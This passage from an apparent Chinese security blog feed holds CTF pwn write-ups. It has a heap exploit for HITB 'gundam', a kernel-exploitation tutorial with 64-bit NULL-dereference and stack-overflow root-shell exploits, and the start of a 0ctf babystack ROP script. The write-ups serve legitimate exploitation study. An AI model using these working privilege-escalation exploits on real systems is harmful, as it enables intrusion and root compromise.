class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'47.75.37.114'</span>, <span class="number">9999</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name,type)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'The name of gundam :'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">'The type of the gundam :'</span>)</span><br><span class="line">p.sendline(str(type))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Which gundam do you want to Destory:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">visit()</span><br><span class="line">p.recvuntil(<span class="string">'Gundam[7] :aaaaaaaa'</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] system:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">destroy(i)</span><br><span class="line">blow()</span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">build(<span class="string">'/bin/sh\0'</span>,<span class="number">1</span>) <span class="comment">#0 1</span></span><br><span class="line">build(<span class="string">'p4nda'</span>,<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">destroy(<span class="number">0</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span>),<span class="number">1</span>)<span class="comment"># 0 1 2</span></span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x30</span>,<span class="number">1</span>)</span><br><span class="line">build(p64(libc.symbols[<span class="string">'system'</span>])*<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">destroy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      记录一下 HITB GSEC CTF 2018 里的once、babypwn和gundam三道PWN题，第一次进入国际比赛的线下赛，٩(๑&gt;◡&lt;๑)۶鸡冻。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF KETNEL PWN 入门记录</title>
    <link href="http://p4nda.top/2018/04/04/kernel-pwn-start/"/>
    <id>http://p4nda.top/2018/04/04/kernel-pwn-start/</id>
    <published>2018-04-04T08:46:04.000Z</published>
    <updated>2018-07-05T13:33:31.524Z</updated>
    
    <content type="html"><![CDATA[<p>从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。</p><p>最开始参考的是安全客上的两篇文章，都来自<a href="https://o0xmuhe.github.io/" target="_blank" rel="noopener">o0xmuhe</a></p><p><a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">Linux 内核漏洞利用教程（一）：环境配置</a></p><p><a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">Linux 内核漏洞利用教程（二）：两个Demo</a></p><p>本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…）</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h2><p>文中提到的安装依赖库及qemu时，在make menuconfig就很懵…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cd linux-2.6.32.1/</span><br><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure><p>突然出现一大堆选项，而且并不知道是干嘛的…</p><p><img src="/img/kernel_pwn_begin/0.png" alt=""></p><p>最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的<strong>Save an Alternate Configuration File</strong>，然后选择默认命名的.config就可以了。</p><p>其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。</p><h2 id="编译busybox"><a href="#编译busybox" class="headerlink" title="编译busybox"></a>编译busybox</h2><p>在编译busybox时，需要去掉</p><p>1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统</p><p><img src="/img/kernel_pwn_begin/1.png" alt=""></p><p>2 Networking Utilities -&gt; [] inetd (Internet超级服务器)</p><p><img src="/img/kernel_pwn_begin/2.png" alt=""></p><h2 id="配置busybox"><a href="#配置busybox" class="headerlink" title="配置busybox"></a>配置busybox</h2><p>qemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功）</p><p>首先，在busy-box的根目录下建立_install文件夹，作为文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125;</span><br></pre></td></tr></table></figure><p>在_install中的etc文件中增加inittab文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> etc</span><br><span class="line">touch inittab</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::askfirst:/bin/ash</span><br><span class="line">::ctrlaltdel:/sbin/reboot</span><br><span class="line">::shutdown:/sbin/swapoff -a</span><br><span class="line">::shutdown:/bin/umount -a -r</span><br><span class="line">::restart:/sbin/init</span><br></pre></td></tr></table></figure><p>增加etc/init.d/rcS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mkdir init.d</span><br><span class="line"><span class="built_in">cd</span> init.d</span><br><span class="line">touch rcS</span><br><span class="line">-----------------------This is Content---------------------------</span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sys none /sys</span><br><span class="line">/bin/mount -n -t sysfs none /sys</span><br><span class="line">/bin/mount -t ramfs none /dev</span><br><span class="line">/sbin/mdev -</span><br></pre></td></tr></table></figure><p>建立完上述文件后，可以制作img镜像了。</p><p>在_install文件夹下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><h2 id="启动qemu"><a href="#启动qemu" class="headerlink" title="启动qemu"></a>启动qemu</h2><p>启动gdb的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb \</span><br><span class="line">    -ex <span class="string">"add-auto-load-safe-path <span class="variable">$(pwd)</span>"</span> \</span><br><span class="line">    -ex <span class="string">"file vmlinux"</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64:intel'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span> \</span><br><span class="line">    -ex <span class="string">'break start_kernel'</span> \</span><br><span class="line">    -ex <span class="string">'continue'</span> \</span><br><span class="line">    -ex <span class="string">'disconnect'</span> \</span><br><span class="line">    -ex <span class="string">'set arch i386:x86-64'</span> \</span><br><span class="line">    -ex <span class="string">'target remote localhost:1234'</span></span><br></pre></td></tr></table></figure><p>启动qemu的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init"</span> --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0</span><br></pre></td></tr></table></figure><h1 id="两个Demo"><a href="#两个Demo" class="headerlink" title="两个Demo"></a>两个Demo</h1><h2 id="编译内核驱动"><a href="#编译内核驱动" class="headerlink" title="编译内核驱动"></a>编译内核驱动</h2><p>编译内核及利用的exp、poc时，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>，<strong>一定要放在之前下载的内核目录下</strong>。</p><p>另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile </p><p>每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。</p><h2 id="NULL-Dereference"><a href="#NULL-Dereference" class="headerlink" title="NULL Dereference"></a>NULL Dereference</h2><p>这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。</p><p>因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。</p><p>和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。</p><p>附64位的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------shellcode.s -----------------</span><br><span class="line">xor %rax,%rax</span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81081030</span></span><br><span class="line">mov %rax,%rdi</span><br><span class="line">call <span class="number">0xffffffff81080e40</span></span><br><span class="line">ret</span><br><span class="line">------------------------<span class="built_in">exp</span>.c ---------------------</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">"\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        mmap(<span class="number">0</span>, <span class="number">4096</span>,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="number">0</span>, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug1"</span>, O_WRONLY);</span><br><span class="line">        write(fd, <span class="string">"muhe"</span>, <span class="number">4</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);<span class="comment">//get root shell</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h2><p>这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了…</p><p>在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> eip,user_cs,user_eflags,user_sp,user_ss;</span><br><span class="line"><span class="keyword">char</span> bin_sh[] = <span class="string">"/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *rsp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i = <span class="number">0x50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> j = <span class="number">0x78</span>;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//"pushq %%ss\n"</span></span><br><span class="line">        <span class="string">"subq %2,%%rsp\n"</span></span><br><span class="line">        <span class="string">"movq %%ss,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rsp\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="comment">//"pushq %%cs\n"</span></span><br><span class="line">        <span class="string">"movq %%cs,%%rax\n"</span></span><br><span class="line">        <span class="string">"pushq %%rax\n"</span>        </span><br><span class="line">        <span class="string">"pushq %0\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp,%1\n"</span></span><br><span class="line">        <span class="string">"addq %3,%%rsp"</span></span><br><span class="line">        :<span class="string">"=m"</span>(eip),<span class="string">"=r"</span>(user_sp),<span class="string">"=m"</span>(i),<span class="string">"=m"</span>(j)</span><br><span class="line">        :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080db0</span>;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL = (<span class="keyword">void</span>*) <span class="number">0xffffffff81080bc0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//payload here    </span></span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %0,%%rsp\n"</span></span><br><span class="line">        <span class="string">"iretq\n"</span></span><br><span class="line">        :<span class="string">"=m"</span>(user_sp)</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0x41</span>,<span class="number">40</span>);</span><br><span class="line">    eip =(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) get_shell;</span><br><span class="line">    *((<span class="keyword">void</span>**)(buf+<span class="number">32</span>)) = &amp;payload; <span class="comment">//set eip to payload</span></span><br><span class="line">    init_tf_work();</span><br><span class="line">    write(<span class="number">1</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/bug2"</span>,O_WRONLY);</span><br><span class="line">    <span class="comment">//exploit</span></span><br><span class="line">    write(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。最开始参考的是安全客上的两篇文章，都来自o0xmuhe师傅的Linux 内核漏洞利用教程（一）：环境配置、Linux 内核漏洞利用教程（二）：两个Demo。本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差...）
    
    </summary>
    
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>0ctf 2018 PWN 部分题解</title>
    <link href="http://p4nda.top/2018/04/04/0ctf2018/"/>
    <id>http://p4nda.top/2018/04/04/0ctf2018/</id>
    <published>2018-04-04T07:42:05.000Z</published>
    <updated>2018-07-05T13:28:41.852Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。</p><p><img src="/img/0CTF2018/0.png" alt=""></p><p>靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。</p><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。</p><p>这篇博客对这个知识点讲的很清楚 <a href="http://www.freebuf.com/articles/system/149214.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/149214.html</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"><span class="comment">#flag&#123;return_to_dlresolve_for_warming_up&#125;</span></span><br><span class="line">ct = string.ascii_letters+string.digits</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(io)</span>:</span></span><br><span class="line"><span class="comment">#io.recvuntil("+")</span></span><br><span class="line">s = io.recvline()[:<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#io.recvuntil("== ")</span></span><br><span class="line"><span class="comment">#dst = io.recvuntil("\n")[:-1]</span></span><br><span class="line"><span class="keyword">print</span> repr(s)</span><br><span class="line"><span class="comment">#print repr(dst)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpre</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> c1 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c2 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c3 <span class="keyword">in</span> ct:</span><br><span class="line"><span class="keyword">for</span> c4 <span class="keyword">in</span> ct:</span><br><span class="line">pre = c1 + c2 + c3 + c4</span><br><span class="line"><span class="comment">#hasho = hashlib.sha256(s+pre)</span></span><br><span class="line"><span class="comment">#print hasho.hexdigest()</span></span><br><span class="line"><span class="keyword">if</span> hashlib.sha256(s + pre).digest().startswith(<span class="string">'\0\0\0'</span>):<span class="comment">#hasho.hexdigest().lower().startswith('\0\0\0'):</span></span><br><span class="line"><span class="keyword">return</span> pre</span><br><span class="line">pre = getpre()</span><br><span class="line"><span class="keyword">print</span> pre</span><br><span class="line">io.send(pre)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">'202.120.7.202'</span>, <span class="number">6666</span>)</span><br><span class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">login(p)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss_start = <span class="number">0x804a000</span></span><br><span class="line">leave_ret = <span class="number">0x8048455</span></span><br><span class="line">pppr = <span class="number">0x080484e9</span></span><br><span class="line">relplt = <span class="number">0x80482b0</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x80484e9')</span></span><br><span class="line">part1 = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(bss_start+<span class="number">0x800</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_start+<span class="number">0x800</span>) + p32(<span class="number">40</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part1 '</span> ,len(part1)</span><br><span class="line"><span class="comment">#p.send(part1)</span></span><br><span class="line">rop1 = p32(bss_start+<span class="number">0x800</span>+<span class="number">0x200</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_start + <span class="number">0x100</span>)  +p32(<span class="number">44</span>)</span><br><span class="line">rop1 